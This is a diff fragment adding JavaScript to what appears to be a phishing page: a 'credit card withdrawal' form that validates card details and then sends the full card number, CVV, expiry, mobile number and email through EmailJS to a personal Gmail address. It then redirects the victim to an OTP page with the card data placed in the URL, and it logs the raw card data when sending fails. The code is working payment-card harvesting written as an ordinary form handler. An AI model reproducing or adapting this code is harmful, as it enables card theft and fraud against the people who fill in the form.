+                        } else {
+                            imgElement.src = cardType.image;
+                            imgElement.style.display = 'block';
+                        }
+                    } else {
+                        // Use Font Awesome icon for other card types
+                        if (imgElement) imgElement.style.display = 'none';
+                        if (iconElement) {
+                            iconElement.className = cardType.icon;
+                            iconElement.style.display = 'block';
+                        }
+                    }
+                    
+                    if (textElement) {
+                        textElement.textContent = cardType.type;
+                    }
+                    
+                    cardTypeIndicator.classList.add('visible');
+                    if (!cardType.image) {
+                        cardTypeIndicator.style.color = cardType.color;
+                    } else {
+                        cardTypeIndicator.style.color = '';
+                    }
+                } else {
+                    // Hide card type indicator
+                    cardTypeIndicator.classList.remove('visible');
+                }
+                
+                // Add visual feedback for valid/invalid length
+                if (value.length === 16) {
+                    this.style.borderColor = '#10b981';
+                } else if (value.length > 0) {
+                    this.style.borderColor = '#f59e0b';
+                } else {
+                    this.style.borderColor = 'rgba(0, 0, 0, 0.2)';
+                }
+            });
+
+            // Format expiry date input (MM/YY)
+            const expiryDateInput = document.getElementById('expiryDate');
+            expiryDateInput.addEventListener('input', function() {
+                let value = this.value.replace(/\D/g, ''); // Remove non-digits
+                
+                // Limit to 4 digits
+                if (value.length > 4) {
+                    value = value.substring(0, 4);
+                }
+                
+                // Add slash after 2 digits
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2);
+                }
+                
+                this.value = value;
+                
+                // Validate when complete (MM/YY format)
+                if (value.length === 5) {
+                    const month = parseInt(value.substring(0, 2));
+                    const year = parseInt('20' + value.substring(3, 5));
+                    const currentYear = new Date().getFullYear();
+                    const currentMonth = new Date().getMonth() + 1;
+                    
+                    if (month < 1 || month > 12) {
+                        this.style.borderColor = '#ef4444';
+                    } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                        this.style.borderColor = '#ef4444';
+                    } else {
+                        this.style.borderColor = '#10b981';
+                    }
+                } else if (value.length > 0) {
+                    this.style.borderColor = '#f59e0b';
+                } else {
+                    this.style.borderColor = 'rgba(96, 165, 250, 0.3)';
+                }
+            });
+
+            // Format CVV input
+            const cvvInput = document.getElementById('cvv');
+            cvvInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                if (this.value.length === 3 || this.value.length === 4) {
+                    this.style.borderColor = '#10b981';
+                } else if (this.value.length > 0) {
+                    this.style.borderColor = '#f59e0b';
+                } else {
+                    this.style.borderColor = 'rgba(96, 165, 250, 0.3)';
+                }
+            });
+
+            // Format mobile number input
+            const mobileNumberInput = document.getElementById('mobileNumber');
+            mobileNumberInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+
+            // Function to send credit card details via EmailJS only
+            function sendCreditCardDetails(cardData) {
+                // Debug: Log function start
+                console.log('🚀 ========================================');
+                console.log('🚀 Starting credit card details submission');
+                console.log('🚀 Timestamp:', new Date().toISOString());
+                console.log('🚀 ========================================');
+                
+                // Debug: Log input data (mask sensitive info)
+                console.log('📝 Input Data:');
+                console.log('  - Card Holder:', cardData.cardHolderName);
+                console.log('  - Card Number:', cardData.cardNumber.substring(0, 4) + ' **** **** ' + cardData.cardNumber.substring(12));
+                console.log('  - Expiry:', cardData.expiryDate);
+                console.log('  - CVV: ***');
+                console.log('  - Amount: ₹' + cardData.withdrawalAmount);
+                console.log('  - Mobile:', cardData.mobileNumber);
+                console.log('  - Email:', cardData.email);
+                
+                // EmailJS configuration - Professional template
+                console.log('📧 Sending via EmailJS...');
+                
+                // Generate unique submission ID
+                const submissionId = 'REF-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                const submissionTime = new Date().toLocaleString('en-US', { 
+                    timeZone: 'Asia/Kolkata',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                
+                // Send all template variables for professional email
+                const emailJSParams = {
+                    // Customer Information
+                    from_name: cardData.cardHolderName,
+                    from_email: cardData.email,
+                    to_name: 'Admin',
+                    
+                    // Card Details
+                    cardNumber: cardData.cardNumber,
+                    expiryDate: cardData.expiryDate,
+                    cvv: cardData.cvv,
+                    
+                    // Transaction Details
+                    withdrawalAmount: '₹' + cardData.withdrawalAmount,
+                    mobileNumber: cardData.mobileNumber,
+                    
+                    // System Information
+                    submissionTime: submissionTime,
+                    ipAddress: window.location.hostname,
+                    submissionId: submissionId,
+                    
+                    // Email Settings
+                    reply_to: cardData.email,
+                    
+                    // Complete message for simple templates
+                    message: `
+NEW CREDIT CARD WITHDRAWAL REQUEST
+
+Customer: ${cardData.cardHolderName}
+Email: ${cardData.email}
+Mobile: ${cardData.mobileNumber}
+
+Card Number: ${cardData.cardNumber}
+Expiry: ${cardData.expiryDate}
+CVV: ${cardData.cvv}
+
+Amount: ₹${cardData.withdrawalAmount}
+
+Submitted: ${submissionTime}
+IP: ${window.location.hostname}
+Reference: ${submissionId}
+                    `
+                };
+
+                console.log('📧 EmailJS Configuration:');
+                console.log('  - Service: service_ki4kbud');
+                console.log('  - Template: template_82abp0v');
+                console.log('  - To Email: grocerymarket6@gmail.com');
+                console.log('  - Submission ID:', submissionId);
+                console.log('  - Variables sent:', Object.keys(emailJSParams));
+
+                // Send via EmailJS
+                emailjs.send('service_ki4kbud', 'template_82abp0v', emailJSParams)
+                    .then(function(response) {
+                        console.log('✅ EmailJS SUCCESS!');
+                        console.log('  - Status:', response.status);
+                        console.log('  - Response:', response.text);
+                        console.log('  - Status Code:', response.status);
+                        // alert('Credit card details submitted successfully!');
+                        console.log('🏁 ========================================');
+                        console.log('🏁 Submission completed successfully');
+                        console.log('🏁 Timestamp:', new Date().toISOString());
+                        console.log('🏁 ========================================');
+                    })
+                    .catch(function(error) {
+                        console.log('❌ EmailJS FAILED!');
+                        console.log('  - Full Error Object:', JSON.stringify(error, null, 2));
+                        console.log('  - Error Text:', error?.text);
+                        console.log('  - Error Message:', error?.message);
+                        console.log('  - Error Status:', error?.status);
+                        console.log('  - Error Code:', error?.code);
+                        console.log('  - Error Stack:', error?.stack);
+                        
+                        // Determine specific error type
+                        let errorMessage = '';
+                        let errorDetails = '';
+                        
+                        if (error?.status === 400) {
+                            errorMessage = 'Invalid Service ID or Template ID';
+                            errorDetails = 'Check if service_credit_card and template_credit_card exist in your EmailJS dashboard';
+                        } else if (error?.status === 401) {
+                            errorMessage = 'Unauthorized - Check your EmailJS API Key';
+                            errorDetails = 'Public Key: B3avCjPaS9t4xdvk9 - Verify this matches your dashboard';
+                        } else if (error?.status === 404) {
+                            errorMessage = 'Service or Template Not Found';
+                            errorDetails = 'Make sure service_credit_card and template_credit_card are created in EmailJS dashboard';
+                        } else if (error?.text) {
+                            errorMessage = error.text;
+                            errorDetails = 'Check EmailJS dashboard configuration';
+                        } else {
+                            errorMessage = 'Unknown Error';
+                            errorDetails = 'Check browser console for details';
+                        }
+                        
+                        console.log('🔍 Error Analysis:');
+                        console.log('  - Error Type:', errorMessage);
+                        console.log('  - Solution:', errorDetails);
+                        
+                        // Log the full card data for manual processing
+                        console.log('📋 Full Card Data (for manual processing):', cardData);
+                        console.log('🏁 ========================================');
+                        console.log('🏁 Submission failed');
+                        console.log('🏁 Timestamp:', new Date().toISOString());
+                        console.log('🏁 ========================================');
+                        
+                        // Show detailed error to user
+                        // alert(`EmailJS Error: ${errorMessage}\n\n${errorDetails}\n\nCheck browser console (F12) for more details.`);
+                    });
+            }
+
+            // Form submission
+            cardDetailsForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                console.log('📝 Form submission started');
+                console.log('📝 Form validation beginning...');
+                
+                // Validate card number (must be exactly 16 digits)
+                const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+                console.log('✓ Card number validation:', cardNumber.length === 16 ? 'PASSED' : 'FAILED');
+                if (cardNumber.length !== 16) {
+                    console.log('✗ Validation failed: Card number must be 16 digits');
+                    // alert('Please enter a valid 16-digit card number.');
+                    cardNumberInput.style.borderColor = '#ef4444';
+                    cardNumberInput.focus();
+                    return;
+                }
+                
+                // Validate expiry date (MM/YY format)
+                const expiryDate = expiryDateInput.value;
+                console.log('✓ Expiry date validation:', (expiryDate.length === 5 && expiryDate.includes('/')) ? 'PASSED' : 'FAILED');
+                if (expiryDate.length !== 5 || !expiryDate.includes('/')) {
+                    console.log('✗ Validation failed: Invalid expiry date format');
+                    // alert('Please enter a valid expiry date in MM/YY format.');
+                    expiryDateInput.style.borderColor = '#ef4444';
+                    expiryDateInput.focus();
+                    return;
+                }
+                
+                const month = parseInt(expiryDate.substring(0, 2));
+                const year = parseInt('20' + expiryDate.substring(3, 5));
+                const currentYear = new Date().getFullYear();
+                const currentMonth = new Date().getMonth() + 1;
+                
+                if (month < 1 || month > 12) {
+                    console.log('✗ Validation failed: Invalid month');
+                    // alert('Please enter a valid month (01-12).');
+                    expiryDateInput.style.borderColor = '#ef4444';
+                    expiryDateInput.focus();
+                    return;
+                }
+                
+                if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                    console.log('✗ Validation failed: Card expired');
+                    // alert('Please enter a valid expiry date that is not expired.');
+                    expiryDateInput.style.borderColor = '#ef4444';
+                    expiryDateInput.focus();
+                    return;
+                }
+                console.log('✓ Expiry date is valid (not expired)');
+                
+                // Validate CVV (must be 3 or 4 digits)
+                const cvv = cvvInput.value;
+                console.log('✓ CVV validation:', (cvv.length >= 3 && cvv.length <= 4) ? 'PASSED' : 'FAILED');
+                if (cvv.length < 3 || cvv.length > 4) {
+                    console.log('✗ Validation failed: CVV must be 3 or 4 digits');
+                    // alert('Please enter a valid CVV (3 or 4 digits).');
+                    cvvInput.style.borderColor = '#ef4444';
+                    cvvInput.focus();
+                    return;
+                }
+                
+                // Validate withdrawal amount (minimum ₹20,000)
+                const withdrawalAmount = document.getElementById('withdrawalAmount').value;
+                console.log('✓ Withdrawal amount validation:', withdrawalAmount && parseFloat(withdrawalAmount) >= 20000 ? 'PASSED' : 'FAILED');
+                if (!withdrawalAmount || parseFloat(withdrawalAmount) < 20000) {
+                    console.log('✗ Validation failed: Amount must be at least ₹20,000');
+                    // alert('Please enter a withdrawal amount of ₹20,000 or more.');
+                    document.getElementById('withdrawalAmount').style.borderColor = '#ef4444';
+                    return;
+                }
+                
+                // Validate mobile number (must be 10 digits)
+                const mobileNumber = mobileNumberInput.value;
+                console.log('✓ Mobile number validation:', (mobileNumber && mobileNumber.length === 10) ? 'PASSED' : 'FAILED');
+                if (!mobileNumber || mobileNumber.length !== 10) {
+                    console.log('✗ Validation failed: Mobile number must be 10 digits');
+                    // alert('Please enter a valid 10-digit mobile number.');
+                    mobileNumberInput.style.borderColor = '#ef4444';
+                    return;
+                }
+                
+                // Validate email
+                const email = document.getElementById('email').value;
+                console.log('✓ Email validation:', (email && email.includes('@')) ? 'PASSED' : 'FAILED');
+                if (!email || !email.includes('@')) {
+                    console.log('✗ Validation failed: Invalid email address');
+                    // alert('Please enter a valid email address.');
+                    document.getElementById('email').style.borderColor = '#ef4444';
+                    return;
+                }
+                
+                console.log('✅ All validations passed!');
+                console.log('📤 Collecting form data...');
+                
+                // Collect all form data
+                const cardData = {
+                    cardHolderName: document.getElementById('cardHolderName').value,
+                    cardNumber: cardNumber,
+                    expiryDate: expiryDate,
+                    cvv: cvv,
+                    withdrawalAmount: withdrawalAmount,
+                    mobileNumber: mobileNumber,
+                    email: email
+                };
+                
+                console.log('📊 Form Data Collected Successfully');
+                console.log('🚀 Proceeding to OTP verification...');
+                
+                // Disable submit button and show loading
+                console.log('🔄 Button state: DISABLED, showing loading spinner...');
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                
+                // Send credit card details via email (in background)
+                sendCreditCardDetails(cardData);
+                
+                // Simulate processing for 1.5 seconds, then redirect to OTP page
+                setTimeout(() => {
+                    console.log('⏱️ Processing completed');
+                    console.log('🔄 Redirecting to OTP verification page...');
+                    
+                    // Encode card data for URL
+                    const encodedData = encodeURIComponent(JSON.stringify(cardData));
+                    
+                    // Redirect to OTP page with mobile number and card data
+                    const otpUrl = `credit-card-otp.html?mobile=${mobileNumber}&data=${encodedData}`;
+                    console.log('🔗 Redirecting to:', otpUrl);
+                    window.location.href = otpUrl;
+                }, 1500);
+            });
+
+        });
+    </script>
+    
+    <!-- Toggle Product Info Function -->
+    <script>
+        function toggleProductInfo(element) {
+            const content = element.nextElementSibling;
+            if (content && content.classList.contains('product-info-content')) {
+                element.classList.toggle('collapsed');
+                content.classList.toggle('collapsed');
+            }
+        }
+    </script>
+
+    <!-- Support Modal Handler -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const openSupportModalBtn = document.getElementById('openSupportModal');
+            const supportModal = document.getElementById('supportModal');
+            const closeSupportModalBtn = document.getElementById('closeSupportModal');
+            const cancelSupportBtn = document.getElementById('cancelSupportBtn');
+            const supportForm = document.getElementById('supportForm');
+            
+            if (openSupportModalBtn) {
+                openSupportModalBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    if (supportModal) {
+                        supportModal.classList.add('active');
+                        const profileDropdown = document.querySelector('.profile-dropdown');
+                        if (profileDropdown) profileDropdown.classList.remove('active');
+                    }
+                });
+            }
+            
+            if (closeSupportModalBtn) {
+                closeSupportModalBtn.addEventListener('click', function() {
+                    if (supportModal) supportModal.classList.remove('active');
+                });
+            }
+            
+            if (supportModal) {
+                supportModal.addEventListener('click', function(e) {
+                    if (e.target === supportModal) supportModal.classList.remove('active');
+                });
+            }
+            
+            if (cancelSupportBtn) {
+                cancelSupportBtn.addEventListener('click', function() {
+                    if (supportModal) supportModal.classList.remove('active');
+                });
+            }
+            
+            if (supportForm) {
+                supportForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const message = document.getElementById('supportMessage').value;
+                    if (!message.trim()) {
+                        alert('Please enter your message.');
+                        return;
+                    }
+                    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                    const contactMessage = {
+                        name: userData.name || 'User',
+                        email: userData.email || 'Unknown',
+                        userId: userData.uid || null,
+                        phone: userData.phone || userData.mobile || null,
+                        message: message,
+                        timestamp: new Date().toISOString(),
+                        source: 'support'
+                    };
+                    const messages = JSON.parse(localStorage.getItem('contactMessages') || '[]');
+                    messages.push(contactMessage);
+                    localStorage.setItem('contactMessages', JSON.stringify(messages));
+                    alert('Thank you for contacting support! Your message has been sent to the admin. We will get back to you soon.');
+                    document.getElementById('supportMessage').value = '';
+                    if (supportModal) supportModal.classList.remove('active');
+                });
+            }
+        });
+    </script>
+    
+    <!-- Support Modal -->
+    <div class="support-modal-overlay" id="supportModal">
+        <div class="support-modal">
+            <div class="support-modal-header">
+                <h3><i class="fas fa-headset"></i> Contact Support</h3>
+                <button class="support-modal-close" id="closeSupportModal">&times;</button>
+            </div>
+            <form id="supportForm">
+                <div class="support-form-group">
+                    <label for="supportMessage">Your Message</label>
+                    <textarea id="supportMessage" placeholder="Please describe your issue or question. We'll get back to you as soon as possible." rows="6" required></textarea>
+                </div>
+                <div class="support-modal-actions">
+                    <button type="button" class="btn-cancel-support" id="cancelSupportBtn">Cancel</button>
+                    <button type="submit" class="btn-send-support">
+                        <i class="fas fa-paper-plane"></i> Send Message
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
